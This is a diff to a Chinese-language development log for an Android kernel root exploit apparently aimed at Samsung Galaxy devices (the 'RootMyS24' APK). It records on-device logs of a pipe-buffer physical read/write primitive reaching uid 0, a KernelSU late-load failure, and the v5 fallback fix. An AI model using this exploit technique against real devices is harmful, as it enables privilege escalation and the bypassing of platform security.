@@ -236,3 +236,36 @@ llvm-objdump -d --start-address=<pipe_fcntl 附近> vmlinux_byh7.elf | grep -A20
 **v4 修复**（commit 292cf7b）：`pipe_cache_matches` 放宽为接受**任何非零 slab_cache**，由 `find_pipe_buffer` 做最终验证（page in VMEMMAP + ops==pipe_buf_ops_addr + len in [1,PIPE_RECLAIM] 三重严格特征，不会误判）。64 页扫描 + 逐槽 8B 读取 + gate 内 find 验证均保留。
 
 **待验证**：`RootMyS24-debug-BYH7-pipe-gate-v4.apk`（payload md5 `14dc1c64`）。
+
+---
+
+## 7. v4 真机重大突破 + late-load 修复（v5，2026-08-22/23）
+
+**v4 结果**（`chcbyh7rootmys9280-SM-S9210 (4).txt`）——**pipe physrw 全链路成功**：
+```
+pipe page idx=0 page=ffffff89880a0000 cache18=ffffff8001cf6800 match=1   ← 泄漏页即 normal2k slab！
+phys step pipe probe found=1 pipebuf=ffffff89880a0000 idx=137 scan=1/1/1
+phys step probed read done ok=1 idx=137
+phys step probed write done ok=1
+phys step read64 done ok=1 value=306365737562656e
+root direct start uid=2000 fd=3
+root umh queued wq=... retval=0 socket=1
+app fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0      ← verified=1！
+pipe physrw pid=9250 done=1 root=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0   ← ROOT！
+✔ 临时 root 已获得！
+```
+
+**注意**：本次泄漏页本身就是 kmalloc-2k slab 页（cache18=normal2k，idx=0 直接 match=1），与 v1 的 LRU 匿名页不同——泄漏页类型随分配随机性变化；v4 的放宽匹配 + 64 页扫描保证了两种情况下都能命中。
+
+**剩余失败**：KernelSU late-load：
+```
+✔ ksud 已暂存到 ksud-s25u-kdp / .ksud-stage
+ksud late-load: exit=10
+late-load: private mount namespace: Permission denied
+✗ 失败: KernelSU late-load 失败 (exit=10)
+```
+**根因**：`unshare(CLONE_NEWNS)` 需要 CAP_SYS_ADMIN，但 Android usermodehelper（UMH）创建的 root 进程 capability bounding set 受限 → EPERM。测试者反馈"显示成功却卡死"——root 已获得（App 显示成功），但 KernelSU 未加载，且 root 守护进程/keeper 持续运行可能导致系统不稳定。
+
+**v5 修复**（commit 3753779）：`run_kernelsu_late_load` 中 unshare(CLONE_NEWNS) 失败时 fallback 直接 exec `/data/local/tmp/ksud-s25u-kdp`（SELinux 已 permissive，无需 bind mount 到 /system/bin/logcat）。注意 `make stable` 只构建 app .so，root helper 需 `make app` 单独构建——APK 中旧 root helper 不含此修复。
+
+**待验证**：`RootMyS24-debug-BYH7-pipe-gate-v5.apk`（payload md5 `14dc1c64` 不变，root helper md5 `1a79f8b4`）。
